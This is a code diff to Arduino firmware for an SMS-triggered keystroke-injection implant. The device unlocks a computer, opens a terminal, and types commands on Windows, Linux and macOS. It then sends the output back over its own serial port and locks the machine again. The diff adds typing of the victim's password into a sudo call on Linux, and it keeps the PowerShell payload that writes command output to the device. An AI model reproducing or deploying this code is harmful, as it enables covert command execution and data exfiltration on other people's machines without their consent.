@@ -80,7 +80,7 @@ void unlockRunAndExfil(String SMS_text) {
   }
   else if(OS == "lnx"){
     openTerminalLinux();
-    runAndExfilLinux(command);
+    runAndExfilLinux(command, password);
     exitTerminalWindowsLinux();
     lockWindowsLinux();
   }
@@ -95,7 +95,7 @@ void unlockRunAndExfil(String SMS_text) {
     openTerminalWindowsLinux();
     // If it's not windows it will fail, but it would be logged in the history
     runAndExfilWindows(command);
-    runAndExfilLinux(command);
+    runAndExfilLinux(command, password);
     runAndExfilMacOs(command);
     exitTerminalWindowsLinux();
     lockWindowsLinux();
@@ -105,7 +105,7 @@ void unlockRunAndExfil(String SMS_text) {
     openTerminalMultiOs();
     //We try all the payloads
     runAndExfilWindows(command);
-    runAndExfilLinux(command);
+    runAndExfilLinux(command, password);
     runAndExfilMacOs(command);
     //It also closes it for Windows and Linux
     exitTerminalMultiOs();
@@ -198,7 +198,7 @@ void openTerminalWindows(){
   Keyboard.press('\n');
   Keyboard.releaseAll();
   //Powershell needs time to load (at least in my very slow windows laptop)
-  delay(5000);
+  delay(6000);
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press('y');
   Keyboard.press(KEY_BACKSPACE);
@@ -316,7 +316,7 @@ void openTerminalWindowsLinux(){
   Keyboard.press('\n');
   Keyboard.releaseAll();
   //Powershell needs time to load (at least in my very slow windows laptop)
-  delay(5000);
+  delay(6000);
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press('y');
   Keyboard.press(KEY_BACKSPACE);
@@ -550,21 +550,24 @@ void lockMacOs(){
 }
 
 //These strings use a lot of the memory so we use PROGMEM to store it in the code area
-const char powershell_command_1[] PROGMEM = " powershell -Command \"$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace \\\"root\\CIMV2\\\" -Filter \\\"PNPDeviceID like 'USB\\\\VID_2341^&PID_8036%'\\\").Caption; $com=[regex]::match($s,'\\(([^\\)]+)\\)').Groups[1].Value; $cmd=";
-const char powershell_command_2[] PROGMEM = "; $port= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one; $port.open(); $port.WriteLine(\\\"$cmd\\\"); $port.Close();";
+//const char powershell_command_1[] PROGMEM = " powershell -Command \"$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace \\\"root\\CIMV2\\\" -Filter \\\"PNPDeviceID like 'USB\\\\VID_2341^&PID_8036%'\\\").Caption; $com=[regex]::match($s,'\\(([^\\)]+)\\)').Groups[1].Value; $cmd=";
+//const char powershell_command_2[] PROGMEM = ;
 
 void runAndExfilWindows(String command) {
-  Keyboard.print(powershell_command_1);
+  Keyboard.print(F(" powershell -Command \"$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace \\\"root\\CIMV2\\\" -Filter \\\"PNPDeviceID like 'USB\\\\VID_2341^&PID_8036%'\\\").Caption; $com=[regex]::match($s,'\\(([^\\)]+)\\)').Groups[1].Value; $cmd="));
   // We avoid concatenation to avoid dynamic memory usage
   Keyboard.print(command);
-  Keyboard.println(powershell_command_2);
+  Keyboard.println(F("; $port= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one; $port.open(); $port.WriteLine(\\\"$cmd\\\"); $port.Close();"));
   delay(3000);  
 }
 
-void runAndExfilLinux(String command) {
-  Keyboard.print(" stty -F /dev/serial/by-id/*Arduino* 38400 && ");
+// In ubuntu we need to be root or part of the dialout group
+void runAndExfilLinux(String command, String password) {
+  Keyboard.print("sudo /bin/bash -c \"stty -F /dev/serial/by-id/*Arduino* 38400 && ");
   Keyboard.print(command);
-  Keyboard.println(" > /dev/serial/by-id/*Arduino* ");
+  Keyboard.println(" > /dev/serial/by-id/*Arduino*\"");
+  delay(1000);
+  Keyboard.println(password);
   delay(3000);  
 }
 
